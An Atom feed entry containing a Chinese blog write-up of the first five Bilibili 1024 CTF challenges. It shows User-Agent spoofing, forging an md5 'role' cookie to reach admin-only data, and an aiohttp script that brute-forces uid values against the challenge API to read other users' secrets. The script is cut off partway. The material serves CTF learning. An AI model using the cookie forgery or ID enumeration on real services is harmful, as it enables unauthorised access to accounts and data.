<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>shniubobo's Blog</title><link href="https://shniubobo.xyz/" rel="alternate"></link><link href="https://shniubobo.xyz/feeds/all.atom.xml" rel="self"></link><id>https://shniubobo.xyz/</id><updated>2020-10-25T00:00:00+08:00</updated><entry><title>B站安全挑战赛解答过程记录</title><link href="https://shniubobo.xyz/article/bilibili-1024.html" rel="alternate"></link><published>2020-10-25T00:00:00+08:00</published><updated>2020-10-25T00:00:00+08:00</updated><author><name>shniubobo</name></author><id>tag:shniubobo.xyz,2020-10-25:/article/bilibili-1024.html</id><summary type="html">B站这次的安全挑战赛看上去挺有意思，前几题也挺简单的，就试着参加了一下。目前只做出来前五题；从第六题开始网页就进不去了，同时 &lt;span class="caps"&gt;IP&lt;/span&gt; 也 ping&amp;nbsp;不通，只能先等页面恢复正常了。先通过这篇文章记录一下前五题的解答过程。</summary><content type="html">&lt;div class="callout callout-info compound"&gt;
&lt;p&gt;由于每个人获得的 &lt;code&gt;flag&lt;/code&gt; 似乎是不同的，因此文中的所有 &lt;code&gt;flag&lt;/code&gt; 都替换成了 &lt;code&gt;[REDACTED]&lt;/code&gt;。同时文中涉及的 Cookie 也都会替换为 &lt;code&gt;[REDACTED]&lt;/code&gt;。&lt;/p&gt;
&lt;/div&gt;
&lt;section id="id1"&gt;
&lt;h3&gt;第一题：页面的背后是什么？&lt;/h3&gt;
&lt;p&gt;这道题很简单，审查元素里可以直接找到：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"flag1"&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"hidden"&lt;/span&gt; &lt;span class="na"&gt;values&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"flag1"&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"[REDACTED]"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/section&gt;
&lt;section id="id2"&gt;
&lt;h3&gt;第二题：真正的秘密只有特殊的设备才能看到&lt;/h3&gt;
&lt;p&gt;第二题同样很简单。根据页面提示：&lt;/p&gt;
&lt;blockquote&gt;
需要使用bilibili Security Browser浏览器访问～&lt;/blockquote&gt;
&lt;p&gt;很容易想到需要修改 &lt;code&gt;User-Agent&lt;/code&gt;。有两种办法。&lt;/p&gt;
&lt;p&gt;第一种方法。可以直接在 Chrome 的 DevTools 中，找到 Network conditions 选项卡，然后取消勾选 User agent 一栏的 &lt;code&gt;Select automatically&lt;/code&gt;，并在下面选择 &lt;code&gt;Custom...&lt;/code&gt;，填入 &lt;code&gt;bilibili Security Browser&lt;/code&gt;。刷新一下即可看到答案。&lt;/p&gt;
&lt;p&gt;第二种方法。可以通过各种 &lt;span class="caps"&gt;HTTP&lt;/span&gt; 客户端，如 &lt;code&gt;curl&lt;/code&gt;、&lt;code&gt;wget&lt;/code&gt;、Postman 等向 &lt;span class="caps"&gt;API&lt;/span&gt; 发送请求。我这里选择使用 &lt;code&gt;httpie&lt;/code&gt;，主要是用起来比较方便。首先通过审查元素找到接口：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ajax&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
&lt;span class="hll"&gt;        &lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"api/ctf/2"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;        &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"get"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;success&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="c1"&gt;//console.log(data);&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mf"&gt;200&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="c1"&gt;// 如果有值：前端跳转&lt;/span&gt;
                &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'#flag2'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"flag2: "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="c1"&gt;// 如果没值&lt;/span&gt;
                &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'#flag2'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"需要使用bilibili Security Browser浏览器访问～"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;从高亮的这一行，可以看出接口是 &lt;code&gt;http://45.113.201.36/api/ctf/2&lt;/code&gt;。此外也可以通过 DevTools 的 Network 选项卡找到接口，不再赘述。&lt;/p&gt;
&lt;p&gt;然后就是发送请求。发送请求时记得带上 &lt;code&gt;Cookie&lt;/code&gt;，否则会提示“请先登录”：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; http http://45.113.201.36/api/ctf/2 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="s2"&gt;"User-Agent: bilibili Security Browser"&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="s2"&gt;"Cookie: [REDACTED]"&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Connection: keep-alive&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 67&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: application/json&lt;/span&gt;
&lt;span class="go"&gt;Date: [REDACTED]&lt;/span&gt;
&lt;span class="go"&gt;Server: nginx/1.10.3&lt;/span&gt;
&lt;span class="go"&gt;Vary: Cookie&lt;/span&gt;

&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;    "code": 200,&lt;/span&gt;
&lt;span class="go"&gt;    "data": "[REDACTED]",&lt;/span&gt;
&lt;span class="go"&gt;    "msg": ""&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/section&gt;
&lt;section id="id3"&gt;
&lt;h3&gt;第三题：密码是啥？&lt;/h3&gt;
&lt;p&gt;说实话这道题我直到最后都没有想出解法。几个我认为可能有用的地方 &lt;a class="m-footnote" href="#id9" id="id4"&gt;1&lt;/a&gt;：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"flag3"&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"width=device-width, initial-scale=1.0"&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="c1"&gt;//falg 3&lt;/span&gt;

    &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"#submit"&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;click&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;

        &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ajax&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
            &lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"api/ctf/3"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"post"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nx"&gt;contentType&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"application/json"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nx"&gt;dataType&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;"json"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stringify&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
&lt;span class="hll"&gt;                &lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"#name"&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;                &lt;span class="nx"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"#subject"&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
&lt;/span&gt;            &lt;span class="p"&gt;}),&lt;/span&gt;
            &lt;span class="nx"&gt;success&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mf"&gt;200&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                    &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"flag is: "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"用户名或密码错误～"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;})&lt;/span&gt;
        &lt;span class="p"&gt;});&lt;/span&gt;
  &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然而各种尝试无果，各种弱密码也试不出来，最后在 &lt;a href="https://www.hostloc.com/forum.php?mod=redirect&amp;amp;goto=findpost&amp;amp;ptid=757940&amp;amp;pid=9345926" rel="noreferrer" target="_blank"&gt;这个帖子&lt;/a&gt; 里找到了答案，用户名是 &lt;code&gt;admin&lt;/code&gt;，密码是 &lt;code&gt;bilibili&lt;/code&gt;，然而并没有解释是如何得到这个答案的。&lt;/p&gt;
&lt;/section&gt;
&lt;section id="id6"&gt;
&lt;h3&gt;第四题：对不起，权限不足～&lt;/h3&gt;
&lt;p&gt;和第二题一样找到接口，从这一题开始会发现 Cookie 中多了 &lt;code&gt;role&lt;/code&gt; 一项，推测和他有关。观察发现 &lt;code&gt;role&lt;/code&gt; 一共有 32 位，且都在 &lt;code&gt;[0-9a-f]&lt;/code&gt; 的范围内，故推测是 md5 过的信息。页面上提示“超级管理员”，所以可以试试各种和管理员相关的词，比如说 &lt;code&gt;admin&lt;/code&gt;、&lt;code&gt;administrator&lt;/code&gt;、&lt;code&gt;root&lt;/code&gt; 等。最后发现是 &lt;code&gt;Administrator&lt;/code&gt; （首字母大写）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python -c &lt;span class="s2"&gt;"from hashlib import md5; print(md5(b'Administrator').hexdigest())"&lt;/span&gt;
&lt;span class="go"&gt;7b7bc2512ee1fedcd76bdc68926d4f7b&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; http http://45.113.201.36/api/ctf/4 &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="s2"&gt;"Cookie: session=[REDACTED]; role=7b7bc2512ee1fedcd76bdc68926d4f7b"&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Connection: keep-alive&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 67&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: application/json&lt;/span&gt;
&lt;span class="go"&gt;Date: [REDACTED]&lt;/span&gt;
&lt;span class="go"&gt;Server: nginx/1.10.3&lt;/span&gt;
&lt;span class="go"&gt;Vary: Cookie&lt;/span&gt;

&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;    "code": 200,&lt;/span&gt;
&lt;span class="go"&gt;    "data": "[REDACTED]",&lt;/span&gt;
&lt;span class="go"&gt;    "msg": ""&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/section&gt;
&lt;section id="id7"&gt;
&lt;h3&gt;第五题：别人的秘密&lt;/h3&gt;
&lt;p&gt;首先试了几次这题的 &lt;span class="caps"&gt;API&lt;/span&gt;，不管哪个 &lt;code&gt;uid&lt;/code&gt; 返回的 &lt;code&gt;code&lt;/code&gt; 一直都是 &lt;code&gt;403&lt;/code&gt;。观察了一下页面没发现什么信息，故打算直接暴力破解。&lt;/p&gt;
&lt;p&gt;一开始写的脚本用的是 &lt;code&gt;requests&lt;/code&gt; （Python 最常用的 &lt;span class="caps"&gt;HTTP&lt;/span&gt; 库），但是速度感人，又换成了 &lt;code&gt;aiohttp&lt;/code&gt;。跑了很久，服务器还经常不稳定 404，始终没找出正确的 &lt;code&gt;uid&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;后来突然想起在网页里有看到一个 &lt;code&gt;uid&lt;/code&gt;，是 &lt;code&gt;100336889&lt;/code&gt;，猜测答案和这个有关。试了一下这个 &lt;code&gt;uid&lt;/code&gt;，依旧 &lt;code&gt;403&lt;/code&gt;，又把这个作为起始 &lt;code&gt;uid&lt;/code&gt; 放进暴力破解的脚本里，没想到一瞬间就试出来了🤦‍♂️。&lt;/p&gt;
&lt;p&gt;虽然有些杀鸡用牛刀的感觉，还是把脚本代码放出来吧😅：&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;"""\&lt;/span&gt;
&lt;span class="sd"&gt;Copyright (c) 2020 shniubobo&lt;/span&gt;

&lt;span class="sd"&gt;Permission is hereby granted, free of charge, to any person obtaining a&lt;/span&gt;
&lt;span class="sd"&gt;copy of this software and associated documentation files (the "Software"),&lt;/span&gt;
&lt;span class="sd"&gt;to deal in the Software without restriction, including without limitation&lt;/span&gt;
&lt;span class="sd"&gt;the rights to use, copy, modify, merge, publish, distribute, sublicense,&lt;/span&gt;
&lt;span class="sd"&gt;and/or sell copies of the Software, and to permit persons to whom the&lt;/span&gt;
&lt;span class="sd"&gt;Software is furnished to do so, subject to the following conditions:&lt;/span&gt;

&lt;span class="sd"&gt;The above copyright notice and this permission notice shall be included in&lt;/span&gt;
&lt;span class="sd"&gt;all copies or substantial portions of the Software.&lt;/span&gt;

&lt;span class="sd"&gt;THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR&lt;/span&gt;
&lt;span class="sd"&gt;IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&lt;/span&gt;
&lt;span class="sd"&gt;FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE&lt;/span&gt;
&lt;span class="sd"&gt;AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER&lt;/span&gt;
&lt;span class="sd"&gt;LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING&lt;/span&gt;
&lt;span class="sd"&gt;FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER&lt;/span&gt;
&lt;span class="sd"&gt;DEALINGS IN THE SOFTWARE.&lt;/span&gt;
&lt;span class="sd"&gt;"""&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;asyncio&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;aiohttp&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;retrying&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;retry&lt;/span&gt;

&lt;span class="n"&gt;FROM&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;100336889&lt;/span&gt;
&lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'http://45.113.201.36/api/ctf/5'&lt;/span&gt;
&lt;span class="n"&gt;success&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Event&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;


&lt;span class="nd"&gt;@retry&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stop_max_attempt_number&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;make_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;'uid'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
                           &lt;span class="n"&gt;raise_for_status&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;resp_json&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;resp_json&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'code'&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;'SUCCESS - &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s1"&gt;:&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;
                  &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;'    data = &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;resp_json&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"data"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;
                  &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;'    msg = &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;resp_json&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"msg"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;success&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;


&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;cookies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;'role'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'[REDACTED]'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;'session'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'[REDACTED]'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;aiohttp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ClientSession&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FROM&lt;/span&gt;
        &lt;span class="n"&gt;tasks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_task&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;make_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
